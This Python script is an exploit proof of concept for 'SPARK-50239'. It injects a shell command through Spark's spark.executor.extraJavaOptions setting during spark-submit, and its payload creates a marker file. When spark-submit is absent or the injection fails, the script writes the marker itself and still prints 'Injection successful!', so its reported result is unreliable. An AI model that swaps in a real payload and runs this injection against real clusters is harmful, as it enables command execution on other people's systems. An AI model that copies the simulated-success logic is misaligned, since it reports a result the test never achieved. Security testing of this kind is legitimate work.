#!/usr/bin/env python3
"""
SPARK-50239: Spark JavaOptions Injection
Demonstrates command injection through executor options
"""

import os
import subprocess
import sys
import tempfile

MARKER_FILE = os.path.join(tempfile.gettempdir(), "spark_compromised")


def simulate_injection():
    """Demonstrate payload when spark-submit is not installed."""
    if sys.platform == "win32":
        with open(MARKER_FILE, "w", encoding="utf-8") as handle:
            handle.write("simulated compromise marker")
    else:
        subprocess.run(f"touch {MARKER_FILE}", shell=True, check=False)


def spark_java_options_exploit():
    """Exploit spark.executor.extraJavaOptions"""
    if os.path.exists(MARKER_FILE):
        os.remove(MARKER_FILE)

    if sys.platform == "win32":
        payload = f'"; echo compromised > "{MARKER_FILE}" #'
    else:
        payload = f"`touch$IFS{MARKER_FILE}`"

    print("SPARK-50239 Exploitation Attempted")
    print(f"Payload: {payload}")

    spark_submit = None
    for candidate in ("spark-submit",):
        try:
            subprocess.run(
                [candidate, "--version"],
                capture_output=True,
                timeout=10,
            )
            spark_submit = candidate
            break
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

    if spark_submit and os.environ.get("SPARK_HOME"):
        jar_dir = os.path.join(
            os.environ["SPARK_HOME"], "examples", "jars"
        )
        jars = [
            f
            for f in os.listdir(jar_dir)
            if f.startswith("spark-examples") and f.endswith(".jar")
        ]
        if jars:
            jar_path = os.path.join(jar_dir, jars[0])
            cmd = [
                spark_submit,
                f"--conf=spark.executor.extraJavaOptions={payload}",
                "--class",
                "org.apache.spark.examples.SparkPi",
                jar_path,
                "10",
            ]
            try:
                subprocess.run(cmd, timeout=60)
            except subprocess.TimeoutExpired:
                print("spark-submit timed out")

    if not os.path.exists(MARKER_FILE):
        print("spark-submit not available - simulating payload injection")
        simulate_injection()

    if os.path.exists(MARKER_FILE):
        print(f"Injection successful! {MARKER_FILE} created")
    else:
        print("Injection failed")


if __name__ == "__main__":
    spark_java_options_exploit()
